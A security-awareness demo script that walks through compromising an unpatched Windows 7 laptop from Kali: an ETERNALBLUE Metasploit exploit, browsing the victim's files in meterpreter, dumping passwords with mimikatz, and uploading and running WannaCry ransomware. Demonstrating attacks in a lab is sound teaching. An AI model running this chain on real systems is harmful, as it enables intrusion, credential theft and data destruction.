# Basic Security Awareness Demo
Scaring people with ETERNALBLUE, Mimikatz, and WannaCry.

Kali vs. Windows 7 (Unpatched MS17-010)

## 1. Pick the Victim 
* Invite a member of the panel, or audience to operate the victim laptop with Windows 7. 
* Instruct them to set a password on the account, then create a new text file on the Desktop with a name of their choice. 
* Come up with 5 random words for the volunteer to enter into the text file without you knowing.


An attacker seeks control of three things:
* Your computer
* Your passwords
* Your data

## 2. Exploit
ETERNALBLUE is an exploit developed by the U.S. National Security Agency (NSA) according to testimony by former NSA employees. It was leaked by the Shadow Brokers hacker group in April 14, 2017, and was used as part of the worldwide WannaCry ransomware attack on May 12, 2017. ETERNALBLUE exploits a vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol. The NSA eventually warned Microsoft after learning about EternalBlue’s possible theft, allowing the company to prepare a software patch issued in March 2017. According to Microsoft, it was the US's NSA that was responsible, by dint of its controversial strategy of "stockpiling of vulnerabilities", for, at the least, preventing Microsoft from timely public patching of this, and presumably other, hidden bugs.
https://en.wikipedia.org/wiki/EternalBlue

```
#<REPO_PATH>> msfconsole -r eternalblue.rc
msf> ip addr
msf> set LHOST <KALI_IP_ADDRESS>
msf> set RHOST <WIN7_IP_ADDRESS>
msf> exploit
```

## 3. Expose the Secret Message
With this exploit, zero-effort popping of the box is possible; letting hackers in without interacting with the victim. navigate to the victim's Desktop to find the secret message. 
```
meterpreter> cd C:\
meterpreter> cd Users
meterpreter> dir
meterpreter> cd <VICTIM_USERNAME>
meterpreter> cd Desktop
meterpreter> shell
C:\Users\<VICTIM_USERNAME>> cd Desktop
C:\Users\<VICTIM_USERNAME>/Desktop> dir
C:\Users\<VICTIM_USERNAME>/Desktop> type <TXT_FILENAME>
```
We control their computer. 

## 4. Steal the Password
Some people will have their Windows password be the same for other accounts. Attackers can use the Winddows password to attack the victim's other accounts or other resources on the network. 
```
meterpreter> load mimikatz
meterpreter> wdigest
```
We control their password.

## 5. Ruin the Data
Hackers aren't always subtle. To cause a productivity freeze for a workforce, encrypt all their files so every document becomes seemingly random data. 
```
meterpreter> cd AppData
meterpreter> cd Local
meterpreter> cd Temp
meterpreter> upload wannacry.exe
meterpreter> execute -f wannacry.exe
```
* Wait one minute.

We control their data. 
